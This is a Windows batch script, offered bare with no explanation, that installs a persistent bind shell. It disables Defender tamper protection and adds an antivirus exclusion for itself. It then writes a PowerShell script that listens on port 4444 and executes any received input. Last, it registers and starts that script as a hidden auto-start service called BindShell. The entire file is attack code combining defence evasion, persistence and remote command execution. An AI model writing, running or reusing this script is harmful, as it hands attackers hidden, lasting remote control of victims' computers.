@echo off
sc delete BindShell 2>nul
powershell -Command "Set-MpPreference -DisableTamperProtection $true -ea SilentlyContinue; Add-MpPreference -ExclusionPath '%~dpnx0' -ea SilentlyContinue"
powershell -Command "$a=' -nop -ep bypass -w 1 -c ';$s='powershell '+$a+'$l=New-Object Net.Sockets.TcpListener(\"0.0.0.0\",4444);$l.Start();$l.AcceptTcpClient().GetStream()|%{$_=[System.Text.Encoding]::ASCII.GetString([byte[]]$_);iex($_)}'" | Out-File -FilePath .\bind.ps1 -Encoding ASCII
sc create BindShell binpath= "powershell.exe -WindowStyle Hidden -File .\bind.ps1" start= auto
sc start BindShell
